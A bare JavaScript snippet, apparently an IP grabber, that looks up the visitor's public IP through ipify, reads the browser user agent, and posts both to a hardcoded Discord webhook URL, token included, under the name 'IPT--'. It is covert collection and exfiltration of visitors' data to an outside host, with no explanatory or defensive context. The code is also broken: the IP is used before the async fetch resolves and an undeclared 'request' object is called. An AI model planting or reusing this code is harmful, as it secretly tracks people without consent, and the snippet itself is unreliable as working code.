fetch('https://api.ipify.org?format=json')
   .then(response => response.json())
   .then(data => { var script = data.ip });
   var agent = navigator.userAgent;
   var valid = script + " " + agent;
   const xml = new XMLHttpRequest;
   request.open("POST", "https://discord.com/api/webhooks/1121323380285636671/3U0PA0ro8S3MWMOq01dRFfXLlwfe2mrjAT4QqmnIen_Hw4n3G6DBUFzrjSrUeOrPgyQz");

   request.setRequestHeader('Content-type', 'application/json');

   const params = {
     username: "IPT--",
     avatar_url: "",
     content: valid
   }

   request.send(JSON.stringify(params));
